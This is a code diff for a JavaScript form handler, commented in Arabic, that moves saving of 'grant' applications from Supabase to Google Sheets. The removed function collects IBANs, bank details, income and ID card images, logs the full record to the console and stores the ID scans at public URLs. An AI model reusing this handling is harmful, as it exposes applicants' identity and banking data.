@@ -237,7 +237,7 @@ function setupFormListeners() {
         var txNumber = 'WA-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random() * 90000) + 10000);
 
         // حفظ في Supabase أولاً
-        var saved = await saveToSupabase(txNumber);
+        var saved = await saveToGoogleSheets(txNumber);
 
         // إعادة تفعيل الزر
         submitBtn.disabled = false;
@@ -270,80 +270,7 @@ function redirectToWhatsApp() {
     showStep(1);
 }
 
-// ================================
-// SUPABASE
-// ================================
-async function saveToSupabase(txNumber) {
-    try {
-        // التحقق من وجود Supabase
-        if (typeof window.supabase === 'undefined') {
-            console.error('❌ Supabase غير موجود');
-            return false;
-        }
-
-        var client = window.supabase;
-
-        var appData = {
-            transaction_id:    txNumber,
-            full_name:         formData.personalInfo.fullName       || '',
-            country:           formData.personalInfo.country        || '',
-            marital_status:    formData.personalInfo.maritalStatus  || '',
-            num_children:      parseInt(formData.personalInfo.numChildren) || 0,
-            phone:             formData.contactCareer.phone         || '',
-            email:             formData.contactCareer.email         || '',
-            profession:        formData.contactCareer.profession    || '',
-            monthly_income:    parseInt(formData.contactCareer.income) || 0,
-            grant_type:        formData.grantDetails.grantType      || '',
-            grant_amount:      parseInt(formData.grantDetails.grantAmount) || 0,
-            grant_description: formData.grantDetails.grantDescription || '',
-            bank_name:         formData.bankingInfo.bankName        || '',
-            account_holder:    formData.bankingInfo.accountHolder   || '',
-            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, ''),
-            status:            'pending'
-        };
-
-        console.log('📤 حفظ البيانات:', appData);
-
-        var result = await client.from('applications').insert([appData]).select();
-
-        if (result.error) {
-            console.error('❌ خطأ:', result.error.message);
-            return false;
-        }
-
-        console.log('✅ تم الحفظ بنجاح!', result.data);
-
-        // رفع الصور
-        var recordId = result.data[0] && result.data[0].id;
-        if (recordId) {
-            for (var i = 0; i < 2; i++) {
-                var key   = i === 0 ? 'idCardFront' : 'idCardBack';
-                var label = i === 0 ? 'front' : 'back';
-                var file  = formData.attachments[key];
-                if (!file) continue;
-                try {
-                    var path = txNumber + '/' + label + '_' + Date.now() + '.' + file.name.split('.').pop();
-                    var uploadResult = await client.storage.from('applications').upload(path, file, { upsert: true });
-                    if (!uploadResult.error) {
-                        var urlResult = client.storage.from('applications').getPublicUrl(path);
-                        var updateObj = {};
-                        updateObj['id_card_' + label + '_url'] = urlResult.data.publicUrl;
-                        await client.from('applications').update(updateObj).eq('id', recordId);
-                        console.log('✅ تم رفع صورة ' + label);
-                    }
-                } catch(e) {
-                    console.warn('⚠️ فشل رفع الصورة:', e);
-                }
-            }
-        }
-
-        return true;
-
-    } catch(err) {
-        console.error('❌ خطأ عام:', err);
-        return false;
-    }
-}
+// Google Sheets متوفر في js/sheets.js
 
 // Validation on blur
 document.addEventListener('DOMContentLoaded', function() {
